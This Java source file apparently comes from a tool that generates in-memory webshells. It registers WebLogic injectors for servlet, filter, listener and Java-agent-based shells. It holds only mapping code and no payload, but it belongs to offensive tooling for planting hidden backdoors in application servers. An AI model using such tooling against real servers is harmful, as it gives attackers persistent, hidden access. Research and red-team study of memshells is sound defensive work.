package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.injector.weblogic.*;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/24
 */
public class WebLogicShell extends AbstractShell {

    @Override
    public Class<?> getListenerInterceptor() {
        return TomcatShell.ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(SERVLET, WebLogicServletInjector.class)
                .addInjector(FILTER, WebLogicFilterInjector.class)
                .addInjector(LISTENER, WebLogicListenerInjector.class)
                .addInjector(WEBLOGIC_AGENT_SERVLET_CONTEXT, WebLogicServletContextAgentInjector.class)
                .addInjector(WEBLOGIC_AGENT_SERVLET_CONTEXT_ASM, WebLogicServletContextAgentWithAsmInjector.class)
                .build();
    }
}
